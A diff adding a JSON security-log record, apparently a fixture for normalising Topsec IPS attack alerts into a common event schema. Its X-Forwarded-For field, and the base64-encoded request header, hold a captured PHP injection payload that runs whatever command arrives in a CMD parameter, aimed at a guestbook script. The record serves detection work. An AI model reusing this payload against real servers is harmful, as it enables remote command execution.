@@ -1,0 +1,116 @@
+{
+  "tenant_id": "",
+  "occur_time": "2026-01-23 11:00:00",
+  "event_id": "evt-c1080cd883ae13be3a79194a4f6835bac50ef99f3e6e307ae0804ba84cb8d7ac",
+  "log_id": "log-c1080cd883ae13be3a79194a4f6835ba",
+  "data_src_vendor": "topas_ips",
+  "data_src_product": "topas_ips",
+  "data_src_category": "security_log",
+  "data_src_instance_id": "",
+  "log_type": "topas_ips_attack",
+  "log_name": "topas_ips_attack",
+  "event_category": "alert",
+  "event_type": "generic_event",
+  "operation": null,
+  "outcome": "unknown",
+  "severity": null,
+  "observer_vendor": "topas_ips",
+  "observer_product": "topas_ips",
+  "roles_obj": {
+    "source": {
+      "ref_id": "endpoint::203.0.113.143",
+      "entity_type": "endpoint",
+      "endpoint": {
+        "ip": "203.0.113.143",
+        "port": "53490"
+      }
+    },
+    "target": {
+      "ref_id": "endpoint::198.51.100.109",
+      "entity_type": "endpoint",
+      "endpoint": {
+        "ip": "198.51.100.109",
+        "port": "80"
+      }
+    },
+    "carriers": [],
+    "observer": {
+      "product": {
+        "name": "topas_ips"
+      },
+      "device": {
+        "vendor": "topas_ips"
+      }
+    },
+    "related": []
+  },
+  "facets_obj": {
+    "network": {
+      "direction": "c2s",
+      "protocol": {
+        "code": "2"
+      }
+    }
+  },
+  "source_finding_obj": {
+    "original_id": "427299216830932575",
+    "title": "攻击检测（rule 95000）",
+    "count": 1,
+    "rule": {
+      "signature_id": "427299216830932575",
+      "label": "95000"
+    }
+  },
+  "extensions_obj": {
+    "schema_version": 2,
+    "source_private": {
+      "vendor": "topsec",
+      "dev_type": "1",
+      "dev_name": "TopsecOS",
+      "dev_ip": "203.0.113.127",
+      "recorder": "attack",
+      "type": "17",
+      "sub_type": "",
+      "sipv6": "",
+      "dipv6": "",
+      "vid": "",
+      "sdev": "feth1",
+      "ddev": "",
+      "smac": "00:00:00:00:00:01",
+      "dmac": "00:00:00:00:00:02",
+      "op": "1",
+      "rule": "95000",
+      "msg": "22222",
+      "repeat": "1",
+      "cve": "",
+      "app_pro": "1",
+      "app": "HTTP",
+      "appendix": "(URL=http://www.example.com/admbook/write.php)",
+      "response_code": "200 OK",
+      "file": "",
+      "client": "unknown,sun-tzu",
+      "server": "unknown",
+      "sgeo": "Private IP",
+      "dgeo": "Private IP",
+      "x_forwarded_for": "GUESS_WHAT:';if(isset(_GET[CMD])){ECHO'Hi .Master!';INI_SET('max_execution_time',0);PASSTHRU(_GET[CMD]);DIE;}echo'",
+      "x_real_ip": "1::111",
+      "direction": "c2s",
+      "fingerprint": "2,474554#",
+      "req_header": "UE9TVCAvYWRtYm9vay93cml0ZS5waHAgSFRUUC8xLjENClJlZmVyZXI6IGh0dHA6Ly93d3cuc3RvbmVkY29kZXIub3JnL2FkbWJvb2svaW5kZXgucGhwDQpYLUZvcndhcmRlZC1Gb3I6IEdVRVNTX1dIQVQ6JztpZiAoaXNzZXQoJF9HRVRbQ01EXSkpe0VDSE8nSGkgLk1hc3RlciEnO0lOSV9TRVQoJ21heF9leGVjdXRpb25fdGltZScsMCk7UEFTU1RIUlUoJF9HRVRbQ01EXSk7RElFO31lY2hvJw0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlv",
+      "req_body": "cGFnZT0xJm5hbWU9d2hvYW1pJnVybD0mZW1haWw9d2hvYW1pQFNVTlRaVS5DT00maWNxPSZtZXNzYWdlPUklMjBsb3ZlJTIwaXRhbGlhbiUyMGd1eXNl",
+      "resp_header": "SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEFwYWNoZQ0KTGFzdC1Nb2RpZmllZDogTW9uLCAwMiBGZWIgMjAwNCAxMTozMjo0MSBHTVQNCkVUYWc6ICJhODQo=",
+      "resp_body": "UHduVCE=",
+      "topas_ips_recorder": "attack",
+      "topas_ips_raw_action": "1",
+      "topas_ips_raw_result": "0"
+    },
+    "profiles": {},
+    "enrichments": {},
+    "unmapped": {
+      "semantic_status": "reviewed_candidate_sr037",
+      "semantic_review": "SR-037：攻击检测是来源发现，检测声明入 source_finding；op/result 保持来源私有，不映射 outcome。"
+    }
+  },
+  "source_ip": "203.0.113.143",
+  "target_ip": "198.51.100.109"
+}
